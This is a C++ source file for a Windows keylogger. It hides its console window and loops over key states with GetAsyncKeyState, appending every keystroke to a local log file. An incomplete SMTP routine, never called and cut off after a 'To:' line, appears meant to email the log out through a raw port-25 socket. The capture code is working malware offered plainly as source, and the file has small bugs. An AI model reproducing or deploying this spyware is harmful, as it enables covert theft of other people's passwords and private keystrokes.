#include <iostream>
#include <windows.h>
#include <fstream>
#include <stdio.h> 

#define KEY_PRESSED -32767; 

FILE *file; 
FILE *OUTPUT_FILE;  

using namespace std;

int Save(int _key, char *file);
void sendEmail (char *server, char *to, char *from, char *subject, char *message);

int main ()
{

    // Hides the application from the desktop. 
    FreeConsole();

    char i;

    // Logs into file (File Log)
    while (true)
    {
        Sleep(10);

        for (i = 8; i <=255; i++)
            if (GetAsyncKeyState(i) == -32767)
                Save (i, "File Log.txt");
    }
    return 0;
}

int Save (int _key, char*file)
{
    cout << _key << endl;

    Sleep(10);


    OUTPUT_FILE = fopen(file, "a+");
    if (_key == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if (_key == VK_BACK)
        fprintf(OUTPUT_FILE, "%s", "[BACK]");
    else if (_key == VK_LBUTTON)
        fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
    else if (_key == VK_RBUTTON)
        fprintf(OUTPUT_FILE, "%s", "[RBUTTON]");
    else if (_key == VK_RETURN)
        fprintf(OUTPUT_FILE, "%s", "[RETURN]");
    else if (_key == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else if (_key == VK_CAPITAL)
        fprintf(OUTPUT_FILE, "%s", "[CAPITAL]");
    else if (_key == VK_DELETE)
        fprintf(OUTPUT_FILE, "%s", "[DELETE]");
    else
    fprintf(OUTPUT_FILE, "%s", &_key);
    fclose(OUTPUT_FILE);

    return 0;
}

void sendEmail (char *server, char *to, char *from, char *subject, char *message)
{
    SOCKET sockfd; 
    WSADATA wsaData; 
    hostent *host; 
    sockaddr_in dest; 

    int sent; 
    char line [200]; 

    if (WSAStartup(0x202, &wsaData) != SOCKET_ERROR)
    {
        if ((host = gethostbyname(server)) != NULL)
        {
            //Set memory 
            memset(&dest, 0, sizeof(dest)); 
            memcpy(&(dest.sin_addr), host->h_addr, host->h_length); 

            // Prepare Destination 
            dest.sin_family = host->h_addrtype; 
            dest.sin_port = htons(25); 

            // Get Socket 
            sockfd = socket(AF_INET, SOCK_STREAM, 0); 

            // Connect 
            connect(sockfd, (struct sockaddr*)&dest, sizeof(dest)); 

            // Send Command Lines 
            strcpy(line, "help me.someplace.com\n"); 
            
            sent = send(sockfd, line, strlen(line), 0); 
            Sleep(500); 

            strcpy(line, "To:"); 
            strcat(line, to);
        }
    }
}
